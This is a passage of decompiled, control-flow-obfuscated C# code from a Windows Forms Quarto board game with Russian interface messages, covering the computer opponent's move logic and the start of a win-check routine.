		//IL_018a: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a0: Expected O, but got Unknown
		int num = Form1.smethod_38(e) / size;
		int num9 = default(int);
		bool flag2 = default(bool);
		Graphics graphics_ = default(Graphics);
		int num7 = default(int);
		bool flag = default(bool);
		int num4 = default(int);
		while (true)
		{
			int num2 = 499951962;
			while (true)
			{
				uint num3;
				int num8;
				switch ((num3 = (uint)num2 ^ 0x539128DEu) % 24u)
				{
				case 23u:
					num9++;
					num2 = 1693172146;
					continue;
				case 22u:
					Paint_Board();
					num2 = ((int)num3 * -1830408029) ^ 0x3425778D;
					continue;
				case 21u:
					num2 = ((int)num3 * -1952094852) ^ 0x43854C3E;
					continue;
				case 20u:
					flag2 = num9 < 4;
					num2 = 1864200404;
					continue;
				case 19u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.Red, 3f), ((float)num + 0.05f) * (float)size, ((float)num7 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num2 = (int)((num3 * 433828849) ^ 0x3C9444D1);
					continue;
				case 18u:
					if (board[num7, num] == null)
					{
						num2 = 118845999;
						num8 = 118845999;
						continue;
					}
					goto IL_00e7;
				case 17u:
					num2 = (int)((num3 * 523721452) ^ 0x2C23F821);
					continue;
				case 16u:
					Form1.smethod_32((Control)(object)richTextBox1, "Уверены? Для выполнения данного хода нажмите \"Подтвердить\".");
					num2 = (int)((num3 * 2099719690) ^ 0x4692691);
					continue;
				case 14u:
					Form1.smethod_45(graphics_);
					Form1.smethod_30((Control)(object)pictureBox1);
					num2 = ((int)num3 * -2127034116) ^ -699534859;
					continue;
				case 13u:
					num2 = (int)((num3 * 36218297) ^ 0x7237085D);
					continue;
				case 12u:
					num7 = Form1.smethod_39(e) / size;
					if (Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox1), Form1.smethod_38(e), Form1.smethod_39(e)) != Color.FromArgb(0, 0, 0, 0))
					{
						num2 = ((int)num3 * -1608476473) ^ 0x801FC50;
						continue;
					}
					goto IL_00e7;
				case 11u:
					Form1.smethod_7((Control)(object)button2, bool_0: true);
					num2 = ((int)num3 * -1719493863) ^ 0x863A455;
					continue;
				case 10u:
				{
					int num11;
					int num12;
					if (!flag2)
					{
						num11 = -1907113172;
						num12 = -1907113172;
					}
					else
					{
						num11 = -1373245062;
						num12 = -1373245062;
					}
					num2 = num11 ^ ((int)num3 * -2096444711);
					continue;
				}
				case 9u:
					num2 = (int)((num3 * 953283435) ^ 0x4018C950);
					continue;
				case 7u:
					num2 = ((int)num3 * -1084583750) ^ -1436911281;
					continue;
				case 6u:
					flag = Form1.smethod_41((Control)(object)borderBox[num4, num9]) == Color.Blue;
					num2 = 1819043684;
					continue;
				case 5u:
				{
					int num10;
					if (num4 >= 4)
					{
						num2 = 422933289;
						num10 = 422933289;
					}
					else
					{
						num2 = 1428878045;
						num10 = 1428878045;
					}
					continue;
				}
				case 4u:
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num4, num9]), num * size + 4, num7 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					num2 = (int)((num3 * 246851399) ^ 0x746E92B7);
					continue;
				case 3u:
					num9 = 0;
					num2 = 425994403;
					continue;
				case 2u:
				{
					int num5;
					int num6;
					if (flag)
					{
						num5 = -324297750;
						num6 = -324297750;
					}
					else
					{
						num5 = -2115781093;
						num6 = -2115781093;
					}
					num2 = num5 ^ ((int)num3 * -797636743);
					continue;
				}
				case 1u:
					num4 = 0;
					num2 = (int)(num3 * 1162083633) ^ -1128963498;
					continue;
				case 0u:
					num4++;
					num2 = ((int)num3 * -594118646) ^ -1874643805;
					continue;
				default:
					return;
				case 8u:
					break;
				case 15u:
					return;
					IL_00e7:
					num2 = 422933289;
					num8 = 422933289;
					continue;
				}
				break;
			}
		}
	}

	private void Button2_Click(object sender, EventArgs e)
	{
		//IL_10ea: Unknown result type (might be due to invalid IL or missing references)
		//IL_1118: Expected O, but got Unknown
		bool flag11 = default(bool);
		bool flag5 = default(bool);
		int num25 = default(int);
		bool flag9 = default(bool);
		int num14 = default(int);
		int num5 = default(int);
		int num6 = default(int);
		int num4 = default(int);
		int num7 = default(int);
		int num3 = default(int);
		int num17 = default(int);
		int num26 = default(int);
		int num27 = default(int);
		int num8 = default(int);
		bool flag12 = default(bool);
		Figurine[,] array2 = default(Figurine[,]);
		int num18 = default(int);
		int num19 = default(int);
		bool flag = default(bool);
		int num13 = default(int);
		int num31 = default(int);
		bool flag4 = default(bool);
		Graphics graphics_ = default(Graphics);
		int num9 = default(int);
		int num10 = default(int);
		int num20 = default(int);
		bool flag2 = default(bool);
		bool flag3 = default(bool);
		bool flag8 = default(bool);
		bool flag7 = default(bool);
		bool flag13 = default(bool);
		int num16 = default(int);
		Figurine[,] array3 = default(Figurine[,]);
		int num15 = default(int);
		bool flag10 = default(bool);
		bool flag6 = default(bool);
		int num24 = default(int);
		Figurine[,] array = default(Figurine[,]);
		while (true)
		{
			int num = 2010071505;
			while (true)
			{
				uint num2;
				int num61;
				int num60;
				int num35;
				int num34;
				switch ((num2 = (uint)num ^ 0x1539BCFAu) % 179u)
				{
				case 178u:
				{
					int num42;
					int num43;
					if (flag11)
					{
						num42 = -1167061193;
						num43 = -1167061193;
					}
					else
					{
						num42 = -498998295;
						num43 = -498998295;
					}
					num = num42 ^ (int)(num2 * 2110427304);
					continue;
				}
				case 177u:
					num = (int)((num2 * 80616521) ^ 0x4E1DEC0);
					continue;
				case 176u:
					num = ((int)num2 * -1651423205) ^ -1892444740;
					continue;
				case 175u:
					num = 883754899;
					continue;
				case 174u:
				{
					int num53;
					int num54;
					if (flag5)
					{
						num53 = -1477206890;
						num54 = -1477206890;
					}
					else
					{
						num53 = -1151247144;
						num54 = -1151247144;
					}
					num = num53 ^ (int)(num2 * 328890583);
					continue;
				}
				case 173u:
					num = ((int)num2 * -906284511) ^ -741060212;
					continue;
				case 172u:
					num25 = 0;
					num = (int)((num2 * 1420535468) ^ 0x284770C5);
					continue;
				case 171u:
					num = ((int)num2 * -1700619008) ^ -2122465690;
					continue;
				case 170u:
				{
					int num38;
					int num39;
					if (flag9)
					{
						num38 = -419508931;
						num39 = -419508931;
					}
					else
					{
						num38 = -414089597;
						num39 = -414089597;
					}
					num = num38 ^ ((int)num2 * -1415216309);
					continue;
				}
				case 169u:
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					num = (int)(num2 * 1215272962) ^ -548237073;
					continue;
				case 168u:
					Form1.smethod_32((Control)(object)richTextBox1, "Противник сделал ход (зелёный). Выберете поле на доске для выбронной противником фигуры (синий).");
					num = (int)((num2 * 1424441340) ^ 0x6C40529A);
					continue;
				case 167u:
					num14++;
					num = 1059116555;
					continue;
				case 166u:
					Form1.smethod_30((Control)(object)borderBox[num5, num6]);
					num = ((int)num2 * -657099930) ^ -281669581;
					continue;
				case 165u:
					num = (int)(num2 * 399184200) ^ -986112441;
					continue;
				case 164u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num = (int)((num2 * 452191369) ^ 0x85C5238);
					continue;
				case 163u:
					storage[num4, num7] = null;
					Form1.smethod_5((Control)(object)borderBox[num3, num17], Color.Blue);
					num = ((int)num2 * -490019549) ^ -80503953;
					continue;
				case 162u:
					Form1.smethod_5((Control)(object)borderBox[num5, num6], Color.LimeGreen);
					num = ((int)num2 * -1695417079) ^ -1755649129;
					continue;
				case 161u:
					storage[num26, num27] = null;
					num = (int)(num2 * 2107853558) ^ -1312584809;
					continue;
				case 160u:
					num = 1383434190;
					continue;
				case 159u:
					flag9 = num5 < 4;
					num = 722685857;
					continue;
				case 158u:
					num8 = 0;
					num = 117229911;
					continue;
				case 157u:
					num25 = num8;
					num = ((int)num2 * -335199707) ^ -1377290201;
					continue;
				case 156u:
					num = 1446422592;
					continue;
				case 155u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ничья!");
					num = (int)(num2 * 266610998) ^ -2064057325;
					continue;
				case 154u:
					num4 = 0;
					num7 = 0;
					num = (int)(num2 * 508476302) ^ -1548108802;
					continue;
				case 153u:
					Form1.smethod_30((Control)(object)label2);
					num = (int)((num2 * 1339983425) ^ 0x17FBC86F);
					continue;
				case 152u:
					num = ((int)num2 * -2138492777) ^ 0x235F53DA;
					continue;
				case 151u:
				{
					int num50;
					int num51;
					if (!flag12)
					{
						num50 = 1389069866;
						num51 = 1389069866;
					}
					else
					{
						num50 = 1574699584;
						num51 = 1574699584;
					}
					num = num50 ^ (int)(num2 * 1418902426);
					continue;
				}
				case 150u:
				{
					int num47;
					if (array2[num18, num19] == null)
					{
						num = 2017314749;
						num47 = 2017314749;
					}
					else
					{
						num = 2006885408;
						num47 = 2006885408;
					}
					continue;
				}
				case 149u:
				{
					int num44;
					int num45;
					if (flag)
					{
						num44 = -993959518;
						num45 = -993959518;
					}
					else
					{
						num44 = -23734326;
						num45 = -23734326;
					}
					num = num44 ^ ((int)num2 * -652982655);
					continue;
				}
				case 148u:
					num13++;
					num = ((int)num2 * -998164463) ^ -445922546;
					continue;
				case 147u:
				{
					int num32;
					int num33;
					if (!Form1.smethod_46((Control)(object)pictureBox1))
					{
						num32 = -1553261453;
						num33 = -1553261453;
					}
					else
					{
						num32 = -1656627355;
						num33 = -1656627355;
					}
					num = num32 ^ ((int)num2 * -1034160606);
					continue;
				}
				case 146u:
					num31 = 0;
					num = (int)(num2 * 743355523) ^ -240198664;
					continue;
				case 145u:
					if (storage[num3, num17] != null)
					{
						num = ((int)num2 * -1216537013) ^ 0x8EF0370;
						continue;
					}
					goto IL_03f0;
				case 144u:
					num14 = 0;
					num = 2009110060;
					continue;
				case 143u:
					num = ((int)num2 * -2005908519) ^ 0x42B5B74F;
					continue;
				case 142u:
					flag4 = num8 < 4;
					num = 1780442511;
					continue;
				case 141u:
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num4, num7]), num9 * size + 4, num10 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					num = (int)((num2 * 550357032) ^ 0x71D856DE);
					continue;
				case 140u:
					Form1.smethod_47(200);
					num = ((int)num2 * -1165555448) ^ 0x5528E026;
					continue;
				case 139u:
					Form1.smethod_47(200);
					num = ((int)num2 * -1047573379) ^ -125289080;
					continue;
				case 138u:
					num7 = num6;
					num = ((int)num2 * -937742350) ^ -708555260;
					continue;
				case 137u:
					board[num13, num14] = new Figurine(storage[num4, num7]);
					num = (int)((num2 * 1421061014) ^ 0x1CB7E908);
					continue;
				case 136u:
					flag = Form1.smethod_41((Control)(object)borderBox[num5, num6]) == Color.Red;
					num = (int)((num2 * 1926280835) ^ 0x33F9933A);
					continue;
				case 135u:
					num13 = 0;
					num = (int)((num2 * 790741736) ^ 0x569C9BA5);
					continue;
				case 134u:
					Form1.smethod_7((Control)(object)button2, bool_0: false);
					num = ((int)num2 * -695376545) ^ -1578999046;
					continue;
				case 133u:
					num = (int)(num2 * 817581570) ^ -444057477;
					continue;
				case 132u:
					num = (int)(num2 * 1686691194) ^ -776261140;
					continue;
				case 131u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num = ((int)num2 * -550388007) ^ -165307293;
					continue;
				case 130u:
					Form1.smethod_30((Control)(object)borderBox[num3, num17]);
					num = ((int)num2 * -401076419) ^ -32364102;
					continue;
				case 129u:
					num26 = num20;
					num27 = num8;
					num = (int)((num2 * 781838801) ^ 0x267D9D40);
					continue;
				case 128u:
					array2 = (Figurine[,])Form1.smethod_48((Array)board);
					array2[num10, num9] = new Figurine(storage[num4, num7]);
					num18 = 0;
					num = (int)((num2 * 986710317) ^ 0x478A49B);
					continue;
				case 127u:
				{
					int num62;
					int num63;
					if (flag2)
					{
						num62 = 589720563;
						num63 = 589720563;
					}
					else
					{
						num62 = 1875721234;
						num63 = 1875721234;
					}
					num = num62 ^ (int)(num2 * 333887698);
					continue;
				}
				case 126u:
					num = (int)(num2 * 1557066006) ^ -932736714;
					continue;
				case 125u:
					Form1.smethod_30((Control)(object)borderBox[num4, num7]);
					num = (int)(num2 * 2127788601) ^ -1415224913;
					continue;
				case 124u:
					flag3 = num20 < 4;
					num = 409893987;
					continue;
				case 123u:
					Form1.smethod_32((Control)(object)richTextBox1, "QUARTO! Компьютер выиграл!");
					num = 1728728010;
					continue;
				case 122u:
					flag8 = num6 < 4;
					num = 1919205085;
					continue;
				case 121u:
					if (!Stop(board))
					{
						num = ((int)num2 * -1134354038) ^ -1155280411;
						continue;
					}
					goto IL_0712;
				case 120u:
					num19 = 0;
					num = 1044636595;
					continue;
				case 119u:
					flag12 = Standoff(board);
					num = 1015427460;
					continue;
				case 118u:
					Form1.smethod_5((Control)(object)borderBox[num20, num8], Color.White);
					num = ((int)num2 * -1927057783) ^ -194879719;
					continue;
				case 117u:
					if (!flag7)
					{
						num = ((int)num2 * -1524623284) ^ -1940549237;
						continue;
					}
					goto IL_07a5;
				case 116u:
					Form1.smethod_15(timer1);
					num = 648423333;
					continue;
				case 115u:
					num = 273619822;
					continue;
				case 114u:
					flag13 = num13 < 4;
					num = 2060068296;
					continue;
				case 113u:
					flag11 = num16 < 4;
					num = 3366180;
					continue;
				case 112u:
					num26 = 0;
					num = (int)((num2 * 476793839) ^ 0x744CDB13);
					continue;
				case 111u:
					Form1.smethod_30((Control)(object)pictureBox[num20, num8]);
					num = (int)((num2 * 869197334) ^ 0x4C9CB1AC);
					continue;
				case 110u:
					num61 = (Standoff(array3) ? 1 : 0);
					goto IL_083a;
				case 109u:
					array3 = (Figurine[,])Form1.smethod_48((Array)board);
					array3[num13, num14] = new Figurine(storage[num4, num7]);
					if (!Stop(array3))
					{
						num = (int)(num2 * 493730434) ^ -1671289908;
						continue;
					}
					num61 = 1;
					goto IL_083a;
				case 108u:
					num = ((int)num2 * -1560798009) ^ 0x11D496B7;
					continue;
				case 107u:
					num = ((int)num2 * -183261147) ^ -733878080;
					continue;
				case 106u:
					Form1.smethod_20(pictureBox[num4, num7], (Image)null);
					num = (int)((num2 * 841180576) ^ 0x32A4C776);
					continue;
				case 105u:
					Form1.smethod_30((Control)(object)borderBox[num20, num8]);
					num = (int)(num2 * 1534701996) ^ -1322021152;
					continue;
				case 104u:
					if (!Standoff(board))
					{
						num = 2145491946;
						num60 = 2145491946;
						continue;
					}
					goto IL_0712;
				case 103u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ничья!");
					num = ((int)num2 * -304624759) ^ -1306946262;
					continue;
				case 102u:
					num = (int)((num2 * 697636718) ^ 0x54344742);
					continue;
				case 101u:
					num = (int)(num2 * 131005512) ^ -825180190;
					continue;
				case 100u:
				{
					int num58;
					int num59;
					if (!flag4)
					{
						num58 = -1162823069;
						num59 = -1162823069;
					}
					else
					{
						num58 = -1863298052;
						num59 = -1863298052;
					}
					num = num58 ^ (int)(num2 * 1392927147);
					continue;
				}
				case 99u:
					num10 = Form1.smethod_33(rnd, 4);
					num = (int)((num2 * 920706197) ^ 0xC4E0BAE);
					continue;
				case 98u:
					num20++;
					num = ((int)num2 * -1915275087) ^ -1467765070;
					continue;
				case 97u:
					if (num17 == num7)
					{
						goto IL_03f0;
					}
					goto IL_03fc;
				case 96u:
					num20 = 0;
					num = ((int)num2 * -16018727) ^ 0x2563C250;
					continue;
				case 95u:
					Form1.smethod_20(pictureBox[num20, num8], (Image)null);
					num = ((int)num2 * -66806413) ^ -685961303;
					continue;
				case 94u:
					num = ((int)num2 * -1629685791) ^ 0x7AFD5B14;
					continue;
				case 92u:
					num = (int)((num2 * 907398342) ^ 0x469F50DC);
					continue;
				case 91u:
					num19++;
					num = 1044636595;
					continue;
				case 90u:
					num = (int)(num2 * 8919958) ^ -1663601792;
					continue;
				case 89u:
					num = ((int)num2 * -1285384880) ^ -60325569;
					continue;
				case 88u:
				{
					int num57;
					if (num14 >= 4)
					{
						num = 282255022;
						num57 = 282255022;
					}
					else
					{
						num = 491145264;
						num57 = 491145264;
					}
					continue;
				}
				case 87u:
					num31++;
					flag7 = false;
					num = ((int)num2 * -2065780849) ^ -1687887678;
					continue;
				case 86u:
					num = ((int)num2 * -510801199) ^ 0x60EE1F37;
					continue;
				case 84u:
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.LimeGreen, 3f), ((float)num9 + 0.05f) * (float)size, ((float)num10 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = ((int)num2 * -1806312158) ^ -492130624;
					continue;
				case 83u:
					Form1.smethod_5((Control)(object)borderBox[num4, num7], Color.White);
					num = ((int)num2 * -1098189364) ^ -2099168343;
					continue;
				case 82u:
					num18++;
					num = ((int)num2 * -1165236160) ^ 0x6DBDA126;
					continue;
				case 81u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					num = (int)((num2 * 896937625) ^ 0xC8D8C6E);
					continue;
				case 80u:
					num = ((int)num2 * -714084692) ^ -1500694671;
					continue;
				case 79u:
					num16++;
					num = (int)(num2 * 2013990457) ^ -651180268;
					continue;
				case 78u:
					Form1.smethod_30((Control)(object)pictureBox[num4, num7]);
					num = ((int)num2 * -373986954) ^ 0x2714AE65;
					continue;
				case 77u:
				{
					int num55;
					int num56;
					if (!flag13)
					{
						num55 = -420985716;
						num56 = -420985716;
					}
					else
					{
						num55 = -387312772;
						num56 = -387312772;
					}
					num = num55 ^ ((int)num2 * -997705482);
					continue;
				}
				case 76u:
					num = (int)(num2 * 379127736) ^ -1527982372;
					continue;
				case 75u:
				{
					int num52;
					if (num15 >= 4)
					{
						num = 1415290239;
						num52 = 1415290239;
					}
					else
					{
						num = 500941871;
						num52 = 500941871;
					}
					continue;
				}
				case 74u:
				{
					storage[num4, num7] = null;
					int num48;
					int num49;
					if (!Standoff(board))
					{
						num48 = -227722528;
						num49 = -227722528;
					}
					else
					{
						num48 = -2080245104;
						num49 = -2080245104;
					}
					num = num48 ^ ((int)num2 * -532955634);
					continue;
				}
				case 73u:
				{
					int num46;
					if (board[num13, num14] != null)
					{
						num = 1383434190;
						num46 = 1383434190;
					}
					else
					{
						num = 1786617470;
						num46 = 1786617470;
					}
					continue;
				}
				case 72u:
					board[num10, num9] = new Figurine(storage[num4, num7]);
					num = (int)((num2 * 1510825378) ^ 0x13876D6D);
					continue;
				case 71u:
					(menu as Form3).ContinueLock();
					num = (int)(num2 * 1335726091) ^ -1389815162;
					continue;
				case 70u:
				{
					int num40;
					int num41;
					if (flag10)
					{
						num40 = -527897273;
						num41 = -527897273;
					}
					else
					{
						num40 = -1020486024;
						num41 = -1020486024;
					}
					num = num40 ^ (int)(num2 * 695584662);
					continue;
				}
				case 69u:
					Form1.smethod_47(1000);
					num = ((int)num2 * -1645260422) ^ -1473950269;
					continue;
				case 68u:
					num27 = 0;
					num = ((int)num2 * -998098186) ^ -1630690011;
					continue;
				case 67u:
					step++;
					num = (int)(num2 * 1785321945) ^ -960067274;
					continue;
				case 66u:
					Form1.smethod_7((Control)(object)pictureBox[num5, num6], bool_0: false);
					num = (int)((num2 * 398186937) ^ 0x5247E812);
					continue;
				case 65u:
					num6 = 0;
					num = 741909429;
					continue;
				case 64u:
					(menu as Form3).ContinueLock();
					num = ((int)num2 * -1354992968) ^ 0x7C83F131;
					continue;
				case 63u:
				{
					int num36;
					int num37;
					if (!flag6)
					{
						num36 = -2028830101;
						num37 = -2028830101;
					}
					else
					{
						num36 = -1378432833;
						num37 = -1378432833;
					}
					num = num36 ^ ((int)num2 * -432290025);
					continue;
				}
				case 62u:
					if (num31 >= 9)
					{
						num = 1835561345;
						num35 = 1835561345;
						continue;
					}
					goto IL_07a5;
				case 61u:
					num = ((int)num2 * -567117666) ^ 0x261BD7A9;
					continue;
				case 60u:
					Form1.smethod_30((Control)(object)pictureBox[num4, num7]);
					num = ((int)num2 * -1746426388) ^ -697689983;
					continue;
				case 59u:
					num = ((int)num2 * -2034907853) ^ -288376205;
					continue;
				case 58u:
					num = (int)((num2 * 1346548716) ^ 0xCD5AA5C);
					continue;
				case 57u:
					num = (int)(num2 * 1052833703) ^ -725449923;
					continue;
				case 56u:
					num = 712734200;
					continue;
				case 55u:
					num = (int)(num2 * 2099011858) ^ -1291268345;
					continue;
				case 54u:
					Form1.smethod_32((Control)(object)richTextBox1, "Подождите, компьютер делает свой ход.");
					num = ((int)num2 * -1107859132) ^ 0x61919C1C;
					continue;
				case 53u:
					num16 = 0;
					num = 231253425;
					continue;
				case 52u:
					num24 = 0;
					num = (int)((num2 * 160760564) ^ 0x7BBFE67B);
					continue;
				case 51u:
					num = (int)((num2 * 1436764545) ^ 0x7457F9AF);
					continue;
				case 50u:
					array = (Figurine[,])Form1.smethod_48((Array)array2);
					num = ((int)num2 * -866942812) ^ 0x7A5EA68D;
					continue;
				case 49u:
					num6++;
					num = 1541651918;
					continue;
				case 48u:
				{
					int num29;
					int num30;
					if (!flag8)
					{
						num29 = -1235935717;
						num30 = -1235935717;
					}
					else
					{
						num29 = -528705278;
						num30 = -528705278;
					}
					num = num29 ^ (int)(num2 * 1336113307);
					continue;
				}
				case 47u:
					num24 = num20;
					num = ((int)num2 * -635187881) ^ 0x6E67098A;
					continue;
				case 46u:
					num = ((int)num2 * -633835115) ^ 0xE8CF8BD;
					continue;
				case 45u:
					flag7 = true;
					num = (int)((num2 * 1053049892) ^ 0x25B18EF5);
					continue;
				case 44u:
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.LimeGreen, 3f), ((float)num14 + 0.05f) * (float)size, ((float)num13 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num4, num7]), num14 * size + 4, num13 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					num = ((int)num2 * -1863134347) ^ 0x379B4D4A;
					continue;
				case 43u:
					flag6 = Stop(array);
					num = (int)(num2 * 1668366889) ^ -1599463086;
					continue;
				case 42u:
					num = ((int)num2 * -298611561) ^ -742224796;
					continue;
				case 41u:
					num = ((int)num2 * -1827680944) ^ -11244749;
					continue;
				case 40u:
					num = 1452048421;
					continue;
				case 39u:
					num = ((int)num2 * -1736804290) ^ 0x4A0D764F;
					continue;
				case 38u:
					Paint_Board();
					num = ((int)num2 * -2020271650) ^ 0x551B836F;
					continue;
				case 37u:
				{
					int num28;
					if (num19 >= 4)
					{
						num = 1153707447;
						num28 = 1153707447;
					}
					else
					{
						num = 454156387;
						num28 = 454156387;
					}
					continue;
				}
				case 36u:
					flag5 = Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox1), num8 * size + size / 2, (int)(((float)num20 + 0.05f) * (float)size)) == Color.FromArgb(255, 255, 0, 0);
					num = 819265618;
					continue;
				case 35u:
					num = ((int)num2 * -329162223) ^ 0x7011A0A9;
					continue;
				case 34u:
					board[num24, num25] = new Figurine(storage[num26, num27]);
					num = ((int)num2 * -374650701) ^ 0x722DCD14;
					continue;
				case 33u:
					num = (int)(num2 * 1164742977) ^ -1740230227;
					continue;
				case 32u:
					num = (int)(num2 * 669305322) ^ -810299357;
					continue;
				case 31u:
					num = 2006885408;
					continue;
				case 30u:
				{
					int num22;
					int num23;
					if (!flag3)
					{
						num22 = -350422854;
						num23 = -350422854;
					}
					else
					{
						num22 = -1707297658;
						num23 = -1707297658;
					}
					num = num22 ^ (int)(num2 * 123325549);
					continue;
				}
				case 29u:
					Form1.smethod_30((Control)(object)richTextBox1);
					num = (int)(num2 * 42039867) ^ -1156892435;
					continue;
				case 28u:
					num = ((int)num2 * -1358801561) ^ -581423180;
					continue;
				case 27u:
					Form1.smethod_30((Control)(object)borderBox[num4, num7]);
					num = ((int)num2 * -1922823618) ^ 0x209E3AD5;
					continue;
				case 26u:
					num5++;
					num = (int)(num2 * 1546040849) ^ -196898560;
					continue;
				case 25u:
					num15++;
					num = ((int)num2 * -2081400918) ^ 0x374BDFFE;
					continue;
				case 24u:
				{
					int num21;
					if (num18 >= 4)
					{
						num = 875289863;
						num21 = 875289863;
					}
					else
					{
						num = 2108370975;
						num21 = 2108370975;
					}
					continue;
				}
				case 23u:
					num = (int)(num2 * 648007453) ^ -794063870;
					continue;
				case 22u:
					Form1.smethod_32((Control)(object)richTextBox1, "Выберете фигуру, которой будет играть противник.");
					num = (int)((num2 * 249542156) ^ 0x2F992559);
					continue;
				case 21u:
					flag2 = Form1.smethod_41((Control)(object)borderBox[num20, num8]) == Color.Blue;
					num = 1002232057;
					continue;
				case 20u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: true);
					num = (int)((num2 * 1818739302) ^ 0x79E21DF1);
					continue;
				case 19u:
					Form1.smethod_5((Control)(object)borderBox[num4, num7], Color.White);
					num = (int)(num2 * 1433939226) ^ -1696398089;
					continue;
				case 18u:
					step++;
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					num = (int)((num2 * 528437523) ^ 0x5D93657D);
					continue;
				case 17u:
					array[num18, num19] = new Figurine(storage[num3, num17]);
					num = (int)((num2 * 1127748431) ^ 0x7655AB1);
					continue;
				case 16u:
					num3 = Form1.smethod_33(rnd, 4);
					num17 = Form1.smethod_33(rnd, 4);
					num = 1193961499;
					continue;
				case 15u:
					num = (int)(num2 * 527515020) ^ -2005444991;
					continue;
				case 14u:
					Form1.smethod_15(timer1);
					num = (int)(num2 * 1729842258) ^ -1773192203;
					continue;
				case 13u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: false);
					num = (int)((num2 * 1078682719) ^ 0x4ED8966D);
					continue;
				case 12u:
					num = (int)((num2 * 1497338650) ^ 0x73194C8E);
					continue;
				case 11u:
					num5 = 0;
					num = ((int)num2 * -254063416) ^ -1844800212;
					continue;
				case 10u:
					num15 = 0;
					num = (int)(num2 * 2051856402) ^ -657640121;
					continue;
				case 9u:
					Form1.smethod_7((Control)(object)pictureBox[num15, num16], bool_0: true);
					num = 976615257;
					continue;
				case 8u:
					num4 = num5;
					num = (int)((num2 * 1066652948) ^ 0x716195A2);
					continue;
				case 7u:
				{
					num9 = Form1.smethod_33(rnd, 4);
					int num11;
					int num12;
					if (board[num10, num9] == null)
					{
						num11 = -535800071;
						num12 = -535800071;
					}
					else
					{
						num11 = -977220432;
						num12 = -977220432;
					}
					num = num11 ^ (int)(num2 * 1078304685);
					continue;
				}
				case 6u:
					num = 1303747475;
					continue;
				case 5u:
					num8++;
					num = ((int)num2 * -1008316923) ^ -609960724;
					continue;
				case 4u:
					num = 1103990264;
					continue;
				case 3u:
					Form1.smethod_20(pictureBox[num4, num7], (Image)null);
					num = (int)(num2 * 1826849035) ^ -1286724743;
					continue;
				case 2u:
					num = (int)(num2 * 158125493) ^ -1596571473;
					continue;
				case 1u:
					if (num3 == num4)
					{
						num = ((int)num2 * -629521616) ^ 0x28356ADE;
						continue;
					}
					goto IL_03fc;
				case 0u:
					num = (int)(num2 * 1435105716) ^ -1453281052;
					continue;
				default:
					return;
				case 85u:
					break;
				case 93u:
					return;
					IL_03f0:
					num = 1922678055;
					num34 = 1922678055;
					continue;
					IL_03fc:
					num = 1436800339;
					num34 = 1436800339;
					continue;
					IL_083a:
					flag10 = (byte)num61 != 0;
					num = 2146409447;
					continue;
					IL_07a5:
					num = 332954518;
					num35 = 332954518;
					continue;
					IL_0712:
					num = 1606938551;
					num60 = 1606938551;
					continue;
				}
				break;
			}
		}
	}

	private bool Stop(Figurine[,] mem)
	{
		int num5 = default(int);
		bool flag3 = default(bool);
		bool flag2 = default(bool);
		bool flag = default(bool);
		bool flag4 = default(bool);
		bool result = default(bool);
		while (true)
		{
			int num = -1528206820;
			while (true)
			{
				uint num2;
				int num10;
				int num13;
				switch ((num2 = (uint)num ^ 0x85330838u) % 78u)
				{
				case 77u:
				{
					int num26;
					if (mem[0, num5].Point == mem[1, num5].Point)
					{
						num = -2036398326;
						num26 = -2036398326;
					}
					else
					{
						num = -1446336658;
						num26 = -1446336658;
					}
					continue;
				}
				case 76u:
				{
					int num38;
					if (mem[0, 0].Square != mem[1, 1].Square)
					{
						num = -660971124;
						num38 = -660971124;
					}
					else
					{
						num = -1074860160;
						num38 = -1074860160;
					}
					continue;
				}
				case 75u:
					flag3 = true;
					num = ((int)num2 * -407391532) ^ 0x41253A08;
					continue;
				case 74u:
				{
					int num52;
					int num53;
					if (mem[1, 2].Point != mem[2, 1].Point)
					{
						num52 = 335812462;
						num53 = 335812462;
					}
					else
					{
						num52 = 645514067;
						num53 = 645514067;
					}
					num = num52 ^ ((int)num2 * -273075484);
					continue;
				}
				case 73u:
					num = -95746223;
					continue;
				case 72u:
				{
					int num72;
					int num73;
					if (mem[num5, 2] != null)
					{
						num72 = -1144237036;
						num73 = -1144237036;
					}
					else
					{
						num72 = -2136145374;
						num73 = -2136145374;
					}
					num = num72 ^ ((int)num2 * -2011969340);
					continue;
				}
				case 71u:
					if (mem[2, 1].Dark != mem[3, 0].Dark)
					{
						num = (int)((num2 * 1211127070) ^ 0x1E188D0);
						continue;
					}
					goto IL_0134;
				case 69u:
					if (mem[2, num5].Point != mem[3, num5].Point)
					{
						num = ((int)num2 * -875341074) ^ -172295168;
						continue;
					}
					goto IL_0170;
				case 68u:
				{
					int num14;
					int num15;
					if (mem[num5, 3] != null)
					{
						num14 = -593569668;
						num15 = -593569668;
					}
					else
					{
						num14 = -412873534;
						num15 = -412873534;
					}
					num = num14 ^ (int)(num2 * 1644858682);
					continue;
				}
				case 67u:
				{
					int num68;
					int num69;
					if (mem[3, 3] != null)
					{
						num68 = -829456841;
						num69 = -829456841;
					}
					else
					{
						num68 = -669136797;
						num69 = -669136797;
					}
					num = num68 ^ (int)(num2 * 1799129299);
					continue;
				}
				case 66u:
				{
					int num44;
					int num45;
